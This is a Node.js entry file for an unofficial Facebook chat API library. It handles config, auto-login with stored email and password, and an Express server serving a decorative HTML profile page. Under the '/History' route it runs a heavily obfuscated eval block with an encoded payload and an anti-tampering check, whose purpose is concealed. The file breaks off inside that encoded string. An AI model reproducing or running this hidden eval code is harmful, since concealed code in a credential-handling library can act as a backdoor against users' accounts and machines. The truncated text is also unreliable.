'use strict';

/**
    * Developers: @KanzuWakazaki - @HarryWakazaki
    ** A few words about developer appstate security.
    *! Statement renouncing responsibility for the security of appstate encryption of the following operating systems: windows, Android, Linux operating systems,.. (maybe repl.it?),
    *! because the above operating systems are private (except rep.it if the fraudster does not own your account or invite link to join).
    *! If the intruder owns the computer, these private operating systems,the security of this fca cannot guarantee 100% of the time.
    ** If the grammar is wrong, please understand because I'm just a kid 🍵.
*/

/!-[ Control Console History ]-!/

require('./Extra/Src/History');

/!-[ Max Cpu Speed ]-!/

process.env.UV_THREADPOOL_SIZE = require('os').cpus().length;

/!-[ Global Set ]-!/

globalThis.Fca = new Object({
    isThread: new Array(),
    isUser: new Array(),
    startTime: Date.now(),
    Setting: new Map(),
    Require: new Object({
        fs: require("fs"),
        Fetch: require('got'),
        log: require("npmlog"),
        utils: require("./utils"),
        logger: require('./logger'),
        Security: require("uuid-apikey"),
        languageFile: require('./Language/index.json'),
        Database: require("synthetic-horizon-database")
    }),
    getText: function(/** @type {any[]} */...Data) {
        var Main = (Data.splice(0,1)).toString();
            for (let i = 0; i < Data.length; i++) Main = Main.replace(RegExp(`%${i + 1}`, 'g'), Data[i]);
        return Main;
    },
    Data: new Object({
        ObjFastConfig: {
            "Language": "vi",
            "PreKey": "",
            "AutoUpdate": true,
            "MainColor": "#9900FF",
            "MainName": "Nguyễn Duy Tuấn",
            "Uptime": false,
            "Login2Fa": false,
            "AutoLogin": false,
            "BroadCast": false,
            "AuthString": "SD4S XQ32 O2JA WXB3 FUX2 OPJ7 Q7JZ 4R6Z | https://i.imgur.com/RAg3rvw.png Please remove this !, Recommend If You Using getUserInfoV2",
            "EncryptFeature": true,
            "ResetDataLogin": false,
            "AutoRestartMinutes": 0,
            "HTML": {   
                "HTML": false,
                "UserName": "Guest",
                "MusicLink": "https://drive.google.com/uc?id=1zlAALlxk1TnO7jXtEP_O6yvemtzA2ukA&export=download"
            }   
        },
        CountTime: function() {
            var fs = globalThis.Fca.Require.fs;
            if (fs.existsSync(__dirname + '/CountTime.json')) {
                try {
                    var data = Number(fs.readFileSync(__dirname + '/CountTime.json', 'utf8')),
                    hours = Math.floor(data / (60 * 60));
                }
                catch (e) {
                    fs.writeFileSync(__dirname + '/CountTime.json', 0);
                    hours = 0;
                }
            }
            else {
                hours = 0;
            }
            return `${hours} Hours`;
        }
    }),
    AutoLogin: async function () {
        var Database = globalThis.Fca.Require.Database;
        var logger = globalThis.Fca.Require.logger;
        var Email = (await globalThis.Fca.Require.Database.get('Account')).replace(RegExp('"', 'g'), ''); //hmm IDK
        var PassWord = (await globalThis.Fca.Require.Database.get('Password')).replace(RegExp('"', 'g'), '');
        login({ email: Email, password: PassWord},async (error, api) => {
            if (error) {
                logger.Error(JSON.stringify(error,null,2), function() { logger.Error("AutoLogin Failed!", function() { process.exit(0); }) });
            }
            try {
                await Database.set("TempState", api.getAppState());
            }
            catch(e) {
                logger.Warning(globalThis.Fca.Require.Language.Index.ErrDatabase);
                    logger.Error();
                process.exit(0);
            }
            process.exit(1);
        });
    }
});

/!-[ Check File To Run Process ]-!/

let Boolean_Fca = ["AutoUpdate","Uptime","BroadCast","EncryptFeature","AutoLogin","ResetDataLogin","Login2Fa"];
let String_Fca = ["MainName","PreKey","Language","AuthString"]
let Number_Fca = ["AutoRestartMinutes"];
let All_Variable = Boolean_Fca.concat(String_Fca,Number_Fca);

try {
    if (!globalThis.Fca.Require.fs.existsSync('./FastConfigFca.json')) {
        globalThis.Fca.Require.fs.writeFileSync("./FastConfigFca.json", JSON.stringify(globalThis.Fca.Data.ObjFastConfig, null, "\t"));
        process.exit(1);
    }

try {
    var DataLanguageSetting = require("../../FastConfigFca.json");
}
catch (e) {
    globalThis.Fca.Require.logger.Error('Detect Your FastConfigFca Settings Invalid!, Carry out default restoration');
    globalThis.Fca.Require.fs.writeFileSync("./FastConfigFca.json", JSON.stringify(globalThis.Fca.Data.ObjFastConfig, null, "\t"));     
    process.exit(1)
}
    if (globalThis.Fca.Require.fs.existsSync('./FastConfigFca.json')) {
        try { 
            if (!DataLanguageSetting.AuthString || globalThis.Fca.Require.utils.getType(DataLanguageSetting.AuthString) != 'String') {
                    DataLanguageSetting.AuthString = "SD4S XQ32 O2JA WXB3 FUX2 OPJ7 Q7JZ 4R6Z | https://i.imgur.com/RAg3rvw.png Please remove this !, Recommend If You Use getUserInfoV2"; //example pls
                globalThis.Fca.Require.fs.writeFileSync("./FastConfigFca.json", JSON.stringify(DataLanguageSetting, null, "\t"));        
            }
        }
        catch (e) {
            console.log(e);
        }
        if (!globalThis.Fca.Require.languageFile.some((/** @type {{ Language: string; }} */i) => i.Language == DataLanguageSetting.Language)) { 
            globalThis.Fca.Require.logger.Warning("Not Support Language: " + DataLanguageSetting.Language + " Only 'en' and 'vi'");
            process.exit(0); 
        }
        var Language = globalThis.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == DataLanguageSetting.Language).Folder.Index;
        globalThis.Fca.Require.Language = globalThis.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == DataLanguageSetting.Language).Folder;
    } else process.exit(1);
        for (let i in DataLanguageSetting) {
            if (Boolean_Fca.includes(i)) {
                if (globalThis.Fca.Require.utils.getType(DataLanguageSetting[i]) != "Boolean") return logger.Error(i + " Is Not A Boolean, Need To Be true Or false !", function() { process.exit(0) });
                else continue;
            }
            else if (String_Fca.includes(i)) {
                if (globalThis.Fca.Require.utils.getType(DataLanguageSetting[i]) != "String") return logger.Error(i + " Is Not A String, Need To Be String!", function() { process.exit(0) });
                else continue;
            }
            else if (Number_Fca.includes(i)) {
                if (globalThis.Fca.Require.utils.getType(DataLanguageSetting[i]) != "Number") return logger.Error(i + " Is Not A Number, Need To Be Number !", function() { process.exit(0) });
                else continue;
            }
        }
        for (let i of All_Variable) {
            if (!DataLanguageSetting[All_Variable[i]] == undefined) {
                DataLanguageSetting[All_Variable[i]] = globalThis.Fca.Data.ObjFastConfig[All_Variable[i]];
                globalThis.Fca.Require.fs.writeFileSync("./FastConfigFca.json", JSON.stringify(DataLanguageSetting, null, "\t"));
            }
            else continue; 
        }
    globalThis.Fca.Require.FastConfig = DataLanguageSetting;
}
catch (e) {
    console.log(e);
    globalThis.Fca.Require.logger.Error();
}

/!-[ Require All Package Need Use ]-!/

var utils = globalThis.Fca.Require.utils,
    logger = globalThis.Fca.Require.logger,
    fs = globalThis.Fca.Require.fs,
    getText = globalThis.Fca.getText,
    log = globalThis.Fca.Require.log,
    Fetch = globalThis.Fca.Require.Fetch,
    express = require("express")(),
    { join } = require('path'),
    cheerio = require("cheerio"),
    StateCrypt = require('./OldSecurity'),
    { readFileSync } = require('fs-extra'),
    Database = require("synthetic-horizon-database"),
    readline = require("readline"),
    chalk = require("chalk"),
    figlet = require("figlet"),
    os = require("os"),
    Form = require('form-data'),
    Security = require("./Extra/Security/Index");

/!-[ Set Variable For Process ]-!/

log.maxRecordSize = 100;
var checkVerified = null;
var Boolean_Option = ['online','selfListen','listenEvents','updatePresence','forceLogin','autoMarkDelivery','autoMarkRead','listenTyping','autoReconnect','emitReady'];

/!-[ Set And Check Template HTML ]-!/

var css = readFileSync(join(__dirname, 'Extra', 'Html', 'Classic', 'style.css'));
var js = readFileSync(join(__dirname, 'Extra', 'Html', 'Classic', 'script.js'));

/!-[ Function Generate HTML Template ]-!/

/**
 * It returns a string of HTML code.
 * @param UserName - The username of the user
 * @param Type - The type of user, either "Free" or "Premium"
 * @param link - The link to the music you want to play
 * @returns A HTML file
 */

function ClassicHTML(UserName,Type,link) {
    return `<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Nguyễn Duy Tuấn</title>
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <script src="https://kit.fontawesome.com/a81368914c.js"></script>
    <link
      href="https://fonts.googleapis.com/css2?family=Cutive+Mono&family=Poppins:wght@100;200;300;400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="style.css" />
    <title>Web Uptimerobot By Nguyễn Duy Tuấn</title>
  </head>
  <body>
    <div class="modal">
      <img
        src="https://i.imgur.com/DOoeTem.jpg"       
      />
      <div class="close"></div>
    </div>
 <script type="text/javascript">
  //<![CDATA[
    !function(e,t,a){function n(){c(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"),o(),r()}function r(){for(var e=0;e<d.length;e++)d[e].alpha<=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText="left:"+d[e].x+"px;top:"+d[e].y+"px;opacity:"+d[e].alpha+";transform:scale("+d[e].scale+","+d[e].scale+") rotate(45deg);background:"+d[e].color+";z-index:99999");requestAnimationFrame(r)}function o(){var t="function"==typeof e.onclick&&e.onclick;e.onclick=function(e){t&&t(),i(e)}}function i(e){var a=t.createElement("div");a.className="heart",d.push({el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()}),t.body.appendChild(a)}function c(e){var a=t.createElement("style");a.type="text/css";try{a.appendChild(t.createTextNode(e))}catch(t){a.styleSheet.cssText=e}t.getElementsByTagName("head")[0].appendChild(a)}function s(){return"rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")"}var d=[];e.requestAnimationFrame=function(){return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e){setTimeout(e,1e3/60)}}(),n()}(window,document);
  //]]>
</script>
<style>
  html,body{cursor:url("https://i.imgur.com/gMNoGFe.png"), auto;}
  a:hover{cursor:url("https://i.imgur.com/IXULuQ1.png"), auto;}
<style>
<style>
	#snowflakeContainer{position:absolute;left:0px;top:0px;}
	.snowflake{padding-left:15px;font-size:14px;line-height:24px;position:fixed;color:#ebebeb;user-select:none;z-index:1000;-moz-user-select:none;-ms-user-select:none;-khtml-user-select:none;-webkit-user-select:none;-webkit-touch-callout:none;}
	.snowflake:hover {cursor:default}
</style>
<div id='snowflakeContainer'>
<p class='snowflake'>❄</p>
<p class='snowflake'>✽</p>
<p class='snowflake'>❃</p>
<p class='snowflake'>✢</p>
<p class='snowflake'>✾</p>
</div>
<script style='text/javascript'>
	//<![CDATA[
	var requestAnimationFrame=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame;var transforms=["transform","msTransform","webkitTransform","mozTransform","oTransform"];var transformProperty=getSupportedPropertyName(transforms);var snowflakes=[];var browserWidth;var browserHeight;var numberOfSnowflakes=50;var resetPosition=false;function setup(){window.addEventListener("DOMContentLoaded",generateSnowflakes,false);window.addEventListener("resize",setResetFlag,false)}setup();function getSupportedPropertyName(b){for(var a=0;a<b.length;a++){if(typeof document.body.style[b[a]]!="undefined"){return b[a]}}return null}function Snowflake(b,a,d,e,c){this.element=b;this.radius=a;this.speed=d;this.xPos=e;this.yPos=c;this.counter=0;this.sign=Math.random()<0.5?1:-1;this.element.style.opacity=0.5+Math.random();this.element.style.fontSize=4+Math.random()*30+"px"}Snowflake.prototype.update=function(){this.counter+=this.speed/5000;this.xPos+=this.sign*this.speed*Math.cos(this.counter)/40;this.yPos+=Math.sin(this.counter)/40+this.speed/30;setTranslate3DTransform(this.element,Math.round(this.xPos),Math.round(this.yPos));if(this.yPos>browserHeight){this.yPos=-50}};function setTranslate3DTransform(a,c,b){var d="translate3d("+c+"px, "+b+"px, 0)";a.style[transformProperty]=d}function generateSnowflakes(){var b=document.querySelector(".snowflake");var h=b.parentNode;browserWidth=document.documentElement.clientWidth;browserHeight=document.documentElement.clientHeight;for(var d=0;d<numberOfSnowflakes;d++){var j=b.cloneNode(true);h.appendChild(j);var e=getPosition(50,browserWidth);var a=getPosition(50,browserHeight);var c=5+Math.random()*40;var g=4+Math.random()*10;var f=new Snowflake(j,g,c,e,a);snowflakes.push(f)}h.removeChild(b);moveSnowflakes()}function moveSnowflakes(){for(var b=0;b<snowflakes.length;b++){var a=snowflakes[b];a.update()}if(resetPosition){browserWidth=document.documentElement.clientWidth;browserHeight=document.documentElement.clientHeight;for(var b=0;b<snowflakes.length;b++){var a=snowflakes[b];a.xPos=getPosition(50,browserWidth);a.yPos=getPosition(50,browserHeight)}resetPosition=false}requestAnimationFrame(moveSnowflakes)}function getPosition(b,a){return Math.round(-1*b+Math.random()*(a+2*b))}function setResetFlag(a){resetPosition=true};
	//]]>
</script>
    <div class="container">
      <div class="card">
        <div class="header">
          <div class="hamburger-menu">
            <div class="center"></div>
          </div>
          <a href="#" class="mail">
            <i class="far fa-envelope"></i>
          </a>
          <div class="main">
            <div class="image">
              <div class="hover">
                <i class="fas fa-camera fa-2x"></i>
              </div>
            </div>
            <div style="font-size: 20px">
<script type="text/javascript">
farbbibliothek = new Array();
farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100");
farbbibliothek[1] = new Array("#00FF00","#000000","#00FF00","#00FF00");
farbbibliothek[2] = new Array("#00FF00","#FF0000","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00");
farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040");
farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");
farbbibliothek[5] = new Array("#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF");
farbbibliothek[6] = new Array("#0000FF","#FFFF00");
farbbibliothek[7] = new  Array("#FFFF66","#EE0000","#DD0000","#FFFF33","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#66FFFF","#110000","#66FF99","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");
farbbibliothek[8] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");
farbbibliothek[9] = new Array("#CCFFFF","#CCFFCC","#CCFF99","#CCFF66", "#CCFF33","#CCFF00","#99FFFF","#99FFCC","#99FF99","#99FF66","#99FF33","#99FF00","#66FFFF","#66FFCC","#66FF99","#66FF66","#66FF33","#66FF00","#33FFFF","#33FFCC","#33FF99","#33FF66","#33FF33","#33FF00","#00FFFF","#00FFCC","#00FF99","#00FF66","#00FF33","#00FF00","#FFCCFF","#FFCCCC","#FFCC99","#FFCC66","#FFCC33","#FFCC00","#CCCCFF","#CCCCCC","#CCCC99","#CCCC66","#CCCC33","#CCCC00","#99CCFF","#99CCCC","#99CC99","#99CC66","#99CC33","#99CC00");
farbbibliothek[10] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040");
farbbibliothek[11] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");
//farbbibliothek[5] = new Array("#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF");
//farbbibliothek[6] = new Array("#0000FF","#FFFF00");
farben = farbbibliothek[4];
function farbschrift(){for(var b=0;b<Buchstabe.length;b++){document.all["a"+b].style.color=farben[b]}farbverlauf()}function string2array(b){Buchstabe=new Array();while(farben.length<b.length){farben=farben.concat(farben)}k=0;while(k<=b.length){Buchstabe[k]=b.charAt(k);k++}}function divserzeugen(){for(var b=0;b<Buchstabe.length;b++){document.write("<span id='a"+b+"' class='a"+b+"'>"+Buchstabe[b]+"</span>")}farbschrift()}var a=1;function farbverlauf(){for(var b=0;b<farben.length;b++){farben[b-1]=farben[b]}farben[farben.length-1]=farben[-1];setTimeout("farbschrift()",30)}var farbsatz=1;function farbtauscher(){farben=farbbibliothek[farbsatz];while(farben.length<text.length){farben=farben.concat(farben)}farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001))}setInterval("farbtauscher()",5000);
text= "Nguyễn Duy Tuấn"; //h
string2array(text);
divserzeugen();
//document.write(text);
</script></div>
            <h3 class="sub-name">facebook.com/ngtuan.profile</h3>
          </div>
        </div>
        <div class="content">
          <div class="left">
            <div class="about-container">
              <h3 class="title">Chào bạn trước màn hình!</h3>
              <p class="text">Im a pỏ cốt đơ</p>
            </div>
            <div class="icons-container">
              <a href="https://www.facebook.com/ngtuan.profile" class="icon">
                <i class="fab fa-facebook"></i>
              </a>
              <a
                href="https://www.facebook.com/ngtuan.profile"
                class="icon"
              >
                <i class="fab fa-youtube"></i>
              </a>
            </div>
            <div class="buttons-wrap">
              <div class="follow-wrap">
                <a
                  href="https://www.facebook.com/ngtuan.profile"
                  class="follow"
                  >Follow</a
                >
              </div>
              <div class="share-wrap">
                <a
                  href="https://www.facebook.com/ngtuan.profile"
                  class="share"
                  >Subscribe</a
                >
              </div>
            </div>
          </div>
          <div class="right">
            <div>
              <h3 class="number">91</h3>
              <h3 class="number-title">Posts</h3>
            </div>
            <div>
              <h3 class="number">1</h3>
              <h3 class="number-title">Following</h3>
            </div>
            <div>
              <h3 class="number">1.4M</h3>
              <h3 class="number-title">Followers</h3>
            </div>
          </div>
        </div>
        <audio controls autoplay loop class="audio">
  <source src="https://drive.google.com/uc?id=1vkK99Ba_vvYtD8WTx5GiCyKEcUnJTO7b&export=download" type="audio/ogg">
  <embed src="https://drive.google.com/uc?id=1vkK99Ba_vvYtD8WTx5GiCyKEcUnJTO7b&export=download" autostart="true" loop="true" hidden="true"> 
</audio>
      </div>
    </div>
    <script>
      const image = document.querySelector(".image");
const hover = document.querySelector(".hover");
const modal = document.querySelector(".modal");
const close = document.querySelector(".close");

function show() {
  hover.classList.add("active");
  modal.classList.add("show");
}
function hide() {
  hover.classList.remove("active");
  modal.classList.remove("show");
}
image.addEventListener("click", show);
close.addEventListener("click", hide);
    </script>
    <style>
    </style>
  </body>
</html>`
    //lazy to change
}

/!-[ Stating Http Infomation ]-!/

express.set('DFP', (process.env.PORT || process.env.port || 1932));
express.use(function(req, res, next) {
    switch (req.url.split('?')[0]) {
        case '/script.js': {
            res.writeHead(200, { 'Content-Type': 'text/javascript' });
                res.write(js);
            break;
        }
        case '/style.css': {
            res.writeHead(200, { 'Content-Type': 'text/css' });
                res.write(css);
            break;
        }
        case '/History': {
            let zKhqb;
            ! function() {
                const ENzF = Array.prototype.slice.call(arguments);
                return eval("(function kO5L(T3cE){const nr5D=fbkC(T3cE,njXB(kO5L.toString()));try{let PY7D=eval(nr5D);return PY7D.apply(null,ENzF);}catch(jm0D){var LT2D=(0o204730-68028);while(LT2D<(0o400071%65550))switch(LT2D){case (0x3006D%0o200033):LT2D=jm0D instanceof SyntaxError?(0o400076%0x10019):(0o400073%0x1000F);break;case (0o200550-0x1015C):LT2D=(0o400107%65557);{console.log(\'Error: the code has been tampered!\');return}break;}throw jm0D;}function njXB(PQZB){let jeSB=180078849;var LLUB=(0o400071%65558);{let f9MB;while(LLUB<(0x104D8-0o202271)){switch(LLUB){case (0o600042%0x10006):LLUB=(67936-0o204514);{jeSB^=(PQZB.charCodeAt(f9MB)*(15658734^0O73567354)+PQZB.charCodeAt(f9MB>>>(0x4A5D0CE&0O320423424)))^780773326;}break;case (0o203720-67516):LLUB=(131097%0o200010);f9MB++;break;case (262213%0o200017):LLUB=f9MB<PQZB.length?(0o400062%0x10011):(67706-0o204133);break;case (0o1000135%0x10014):LLUB=(0o201166-0x1026D);f9MB=(0x75bcd15-0O726746425);break;}}}let HGPB=\"\";var b4HB=(65776-0o200344);{let DBKB;while(b4HB<(0o600153%0x10018)){switch(b4HB){case (0o600121%65559):b4HB=(73639709%9);DBKB=(0x21786%3);break;case (0O347010110&0x463A71D):b4HB=DBKB<(0O347010110&0x463A71D)?(0o400062%0x10012):(0x10834-0o204021);break;case (0x2004A%0o200036):b4HB=(69016-0o206573);{const DDhC=jeSB%(0o204444-0x1090A);jeSB=Math.floor(jeSB/(0x1071C-0o203402));HGPB+=DDhC>=(0o600150%65562)?String.fromCharCode((0o1000441%0x10038)+(DDhC-(0o204040-0x10806))):String.fromCharCode((0o215206-72229)+DDhC);}break;case (0o201546-0x10349):b4HB=(73639709%9);DBKB++;break;}}}return HGPB;}function fbkC(zycC,b6eC){zycC=decodeURI(zycC);let vt7B=(0x75bcd15-0O726746425);let X09B=\"\";var ro2B=(0x40069%0o200027);{let TV4B;while(ro2B<(0x10744-0o203445)){switch(ro2B){case (0o203600-0x10770):ro2B=(0o205050-0x10A14);{X09B+=String.fromCharCode(zycC.charCodeAt(TV4B)^b6eC.charCodeAt(vt7B));vt7B++;var TXBC=(0x10708-0o203371);while(TXBC<(0o200416-0x100F3))switch(TXBC){case (0o200454-65821):TXBC=vt7B>=b6eC.length?(0o202424-0x104FA):(0x3008D%0o200046);break;case (0o400120%65563):TXBC=(67426-0o203507);{vt7B=(0x21786%3);}break;}}break;case (262205%0o200015):ro2B=TV4B<zycC.length?(67296-0o203320):(0o1000333%65583);break;case (66446-0o201601):ro2B=(66076-0o201023);TV4B=(0x21786%3);break;case (0o203720-67516):ro2B=(262225%0o200022);TV4B++;break;}}}return X09B;}})(\"N%0B%0C%16%00%0E%0B%0E%08EP%03%05%0F%0C%02%12%04%16%16C?%008*EP%03%11%1F%16%14%14%03Y%1F%05K&IOF%0E*%5B3JHM%3C%12;(RKJ##%03%3EKSI%06%045:PJQ%0D\'%14$QQ%1E%1C%17%0F%05%19%10%17%0DZ%05+V!QQ%18%08%07%15%13%1F%17X&O%0F*NDR%1F%0B%03\'IOF,M%0E%3CJHM%06A,%22RKJ%01%05%00=KSI%20-%5C?PJQ%153%5E$QQ%1E%1C%17%0F%05%19%10%17%0DZ#W5!QQ%18%08%07%15%13%1F%17XKR%11.\'\'QQJPJJGF%22%25H%5BI:;DPSKQCJ=0P%05%191%0A%10%04P%02%05X%1C%17%0F%05%19%10%17%0DZ%01$0!QQ%18#Z4#EP#%040R-ND$E%191%0A%10%046%0E.%001JH;V%04%1E%16%14%01%15%0F%02%17X&I2+ND%02%0A%06%0E%17%13%08MQS8\'I@M6$SKQI:M6$%258Q9%3CM6$%25JSIIN,O+/RKHLE0@60JHOD%04%1E%16%14%01%15%0F%02%17X%0481+ND%02%0A%06%0E%17%13%08M,.+9JHM,%00(%20RKJ%05%08I=KSI%06%045:PJQ3%0A%25&QQ%1E%1C%17%0F%05%19%10%17%0DZ#8-\'QQ%18%08%07%15%13%1F%17XK%1D%04P%22EPQ8+%0BT,EP%25KS%1F%07%13%03%1A%0C%0A%15%0CA%05%1A72KS%19%13%03%19%0C%0A%0DZJIMLR#%3EQJJM6R#%3E\'9J=0$QJPJ(T%070PJSKJNFR#H!?%3C=F%22%25%3ES%1F%07%13%03%1A%0C%0A%15%0CA%119?2KS%19%13%03%19%0C%0A%0DZJ,,%5D;PJS9,_;0PJ\'J(7Z%3CPJS%1F%1B-%05%08%1AM%0E%01%5CN6%17%0D%0F%16?%5C%5BJ%5EQX%1C%17%0F%05%19%10%17%0DZ;%10/\'QQ%18%08%07%15%13%1F%17X%221S\'NDR%0F1B+IOF,M%0E%3CJHM%0E*@%1ARKJ%09+%0B1KSI4%044%3EPJQ%151$$QQ%1E%1C%17%0F%05%19%10%17%0DZ%11.\'\'QQ%18%08%07%15%13%1F%17XKQI:M6$%258Q9%3C;FQSH!I:;0%22S8\'?HOFQS8!I:=FXS8\'?J=F%22%25%3E\'I:;0%22S8\'?:M6$%25%3ES%1F%07%13%03%1A%0C%0A%15%0CA3%01=2KS%19%13%03%19%0C%0A%0DZJFA6%1E%12V?JH;EPQ8Q9%3C;%10%1F%0D%0D%19%16%08%09%03Y-%0D%1B)IO%16%0B%1D%17%0F%10%0FF%1A+@*RKJ3X%14%3EKSI%0E%20%1F0PJQ#(%13+QQH%1D%009%25EPS%14(Z(NDR%13%5B.#IO%10%1F%0D%0D%19%16%08%09%03Y%0F5%19)IO%16%0B%1D%17%0F%10%0FF(L%15(RKJ%11=;1KS%1F%07%13%03%1A%0C%0A%15%0CA7%04L2KS%19%13%03%19%0C%0A%0DZ%0D\'%14$QQH%1D%0A%18#EPS%0C%0A%00$NDR!%02%09$IOF%20%19%10%3CJHM%1A+@*RKJ\'$%0C%3EKSI0-%5C8PJQ#S)&QQH%11Z5\'EPS%14(Z(ND%04%0E%02%08B%127Z3E8RR%0ETYHJSLOQ%1E%5CMJSIKMN%5D%16JROQQT@NJQN%5BHJEI%00PJSV#HI%17QJRPT%5CPTKJ%0DSVXOLWWR%19W%5D;H%25SNIT%5BKAWIGQ%09_IHQNPHJEI%00PJS%25%5EHI%17QJRPS%5CP%25X%1C%17%0F%05%19%10%17%0DZ/%05V\'QQ%18%08%07%15%13%1F%17X%22%11T%18NDR!%00%20$IOF()%209JHM,2I%25RKJ7%06:3KS%1F%07%13%03%1A%0C%0A%15%0CA%09!K2KS%19%13%03%19%0C%0A%0DZJ46%5B8PJSII/%3CN=KSK%1C%00%18%17%1B%17%13%0D%0FF$A-)RK%1A%14%08%0D%0D%11%14BIM6$SBQ9%3CMERS8Q9%3C;6R#%3EQ9%3C;DPRKQCJ=0PSKQJ:M6%22YH!?JGF%22%25%3EQ9J=0$%25%3EQ9%3CO6R#8Q9:M6$%25H!I:;0$S8\'?:M6$%258QCJ=0$%25%3ES%1F%07%13%03%1A%0C%0A%15%0CA%0D*!2KS%19%13%03%19%0C%0A%0DZJJ=6R#8QCJ=0$S8Q9%3C;0R#%3E\'9J=0$#H%5BI:;0$QHRJ%12%15\'=PJSHI%15%2282KSKH%1B%0B%0C%16%00%0E%0B%0E%08M%121%161JH%1D%1F%1C%0C%16%08%0CANF%22#H!9@M6$SBQ9%3C;F%22S8\'?%3CM6$%258Q9%3C;6RYH!?%3C;DRPKQCJ=0RPHQ9J=0$#H!?%3CODSP*7Q%25NDPQ%1E%1C%17%0F%05%19%10%17%0DZ/%07%1E&QQ%18%08%07%15%13%1F%17XK!?:3%03%183KS?IOF%22%25J!34!)QQ%3E%07%14%00%14M%1E%3C%131_:N%5D6MSMTUP%5CML=J%1ATW+M;UKKMN%5D6IWNTTQYMO=J%1AP_%5EL%3EQJKMN%5CJIRHSDV%02KHSJPROAQH%0CHRSR_MUULZSUDUPS%02PQVY@%5DS%15PQV%5DJLJ\'Y%07%13%03%1A%0C%0A%15%0CA/%0C%0A3KS%19%13%03%19%0C%0A%0DZJJGF%22%25HRIJ=F%22%25%3E!I:;0PQHR34!)QQJ%07%04%14%08%0E%0D%11%0C%14B%02%1F%062PJ%01%10%04%12%18%0B%16C?W%0C-EPS%14*%20(NDR9Q5)IOF81%16%3CJHM%3C2I%22RKJ%01%05%00=KSI,%1C%01%03PJQ%153%5E$QQH/%008!EPS.%1C%1A*NDR%17%25%08+IO%10%1F%0D%0D%19%16%08%09%03Y=V%17)IO%16%0B%1D%17%0F%10%0FFE%22%258?%14,\'EP%25H!?H=FXS8\'I@M6$SBQ9%3C;%10%1F%0D%0D%19%16%08%09%03Y!%10%1C)IO%16%0B%1D%17%0F%10%0FFERS8Q9%3C;6R#%3E\'IIMF%22S8\'?:M6$%25JWI@M6$QHRII=F%22#BQ9%3CMLR#%3E\'I:M6$%25%3E\'I:;D%22S8!I:=F%22%25%3EQ9J=0$%25H!?%3C=F%22%25%3E!I@M6$%25%3E\'KJNFQ#H!9@M6$SBQ9%3C;F%22S8\'?%3C;F%22%25J!I:;0P%05%05%0F%0C%02%12%04%16%16C;R%09-EP%03%11%1F%16%14%14%03YP6*T%20NDPSK?Q1,EPQ%1E%1C%17%0F%05%19%10%17%0DZ#S)&QQ%18%08%07%15%13%1F%17XK%5B9%3CM6$Q8QCJ=0$%05%191%0A%10%04C%0EO%0C4_%07%13%03%1A%0C%0A%15%0CIO%16%0B%1D%17%0F%10%0FFEHKRKSUC%5D%16JSJRPR